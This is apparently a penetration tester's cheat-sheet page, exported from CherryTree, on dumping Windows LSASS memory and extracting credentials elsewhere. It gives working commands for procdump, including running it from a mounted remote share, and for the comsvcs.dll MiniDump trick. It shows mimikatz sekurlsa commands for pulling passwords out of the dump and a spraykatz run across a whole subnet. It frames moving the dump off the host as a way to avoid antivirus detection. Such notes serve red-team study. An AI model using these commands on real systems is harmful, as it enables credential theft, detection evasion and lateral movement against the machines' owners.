<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Dump LSASS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Dump LSASS and Extract Credentials Elsewhere</h1></strong><br />Executables that try to access LSASS memory might get flagged as malicious by antivirus.<br />Instead of accessing LSASS memory on the current system you can dump the <code>lsass.exe</code> process, transfer it to your attacking machine, and extract passwords there.<br /><br /><strong><h2>## Dump LSASS Process</h2></strong><br />Whilst there are legitimate process dumping tools, <br />the act of dumping <code>lsass.exe</code> might get flagged as malicious.<br /><br /><strong><h3>### Procdump</h3></strong><br /><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a><br />Legit tool by SysInternals, so won&#39;t get detected as malicious.<br /><br />Transfer procdump to target and use locally:<br /><code>C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp</code><br /><br />Use procdump from remote host:<br /><div class="codebox"><div class="codebox">#&nbsp;Mount&nbsp;https://live.sysinternals.com&nbsp;which&nbsp;contains&nbsp;procdump.exe<br />#&nbsp;&nbsp;&nbsp;-&nbsp;or&nbsp;host&nbsp;yourself&nbsp;(python3&nbsp;-m&nbsp;http.server&nbsp;etc.)<br />net&nbsp;use&nbsp;Z:&nbsp;https://live.sysinternals.com<br />Z:\procdump.exe&nbsp;-accepteula&nbsp;-ma&nbsp;lsass.exe&nbsp;lsass.dmp</div></div><br /><br /><strong><h3>### comsvcs.dll</h3></strong><br />MUST BE DONE AS SYSTEM.<br /><code>C:\Windows\System32\comsvcs.dll</code> dumps process memory whenever processes crash.<br /><code>comsvcs.dll</code> contains a function called <code>MiniDumpW</code>.<br /><code>MiniDumpW</code> can be called with <code>rundll32.exe</code>.<br /><br /><code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full</code><br /><br /><strong><h2>## Extract Credentials from LSASS dump</h2></strong><br />Multiple tools available to dump creds from an LSASS dump<br /><br /><strong><h3>### Mimikatz</h3></strong><br /><div class="codebox"><div class="codebox">#&nbsp;Load&nbsp;the&nbsp;dump<br />mimikatz&nbsp;#&nbsp;sekurlsa::minidump&nbsp;lsass.dmp<br />#&nbsp;Extract&nbsp;credentials<br />mimikatz&nbsp;#&nbsp;sekurlsa::logonPasswords</div></div><br /><br /><strong><h2>## 1 &amp; 2 Combined - Dump LSASS &amp; Extract Credentials</h2></strong><br />Do both in one go if available.<br /><br /><strong><h3>### SprayKatz</h3></strong><br /><a href="https://github.com/aas-n/spraykatz">https://github.com/aas-n/spraykatz</a><br />Tries to procdump lsass.exe on remote machines and parse the dumps remotely.<br /><br /><code>spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24</code></div>
</body>
</html>
